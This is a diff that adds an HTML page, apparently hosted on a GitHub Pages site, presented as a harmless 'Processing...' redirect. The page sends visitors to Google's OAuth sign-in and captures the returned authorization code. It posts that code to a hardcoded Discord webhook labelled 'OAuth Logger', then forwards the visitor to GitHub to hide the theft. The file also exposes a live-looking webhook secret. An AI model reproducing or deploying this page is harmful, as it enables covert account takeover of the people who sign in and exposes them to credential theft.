@@ -1,1 +1,57 @@
-<h1>yuh</h1>
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Google OAuth Redirect + Webhook</title>
+  <script>
+    const clientId = "1075675833677-mooft02vsb3thr1v624r7vlfq5ccfri5.apps.googleusercontent.com";
+    const redirectUri = "https://internal-labs.github.io/github";
+    const discordWebhook = "https://discord.com/api/webhooks/1398969038436307087/YGr9e3gcT5z25zvEY71DPnb4SEpBNoVANt6gh5kcsrxpux7LYg3q281JJTlI4uIR1FN7"; // 🔴 REPLACE THIS
+
+    function getQueryParam(param) {
+      const urlParams = new URLSearchParams(window.location.search);
+      return urlParams.get(param);
+    }
+
+    function sendToDiscord(code) {
+      fetch(discordWebhook, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          username: "OAuth Logger",
+          embeds: [
+            {
+              title: "🔐 Google OAuth Code Received",
+              description: `\`\`\`${code}\`\`\``,
+              color: 65280,
+              timestamp: new Date().toISOString()
+            }
+          ]
+        })
+      });
+    }
+
+    window.onload = function () {
+      const code = getQueryParam("code");
+      if (code) {
+        console.log("OAuth Code:", code);
+        sendToDiscord(code);
+        window.location.href = "https://github.com/"
+      } else {
+        const authUrl = `https://accounts.google.com/o/oauth2/v2/auth` +
+          `?client_id=${clientId}` +
+          `&redirect_uri=${encodeURIComponent(redirectUri)}` +
+          `&response_type=code` +
+          `&scope=openid%20email%20profile` +
+          `&access_type=online` +
+          `&prompt=select_account`;
+        window.location.href = authUrl;
+      }
+    };
+  </script>
+</head>
+<body>
+  <p>Processing...</p>
+</body>
+</html>
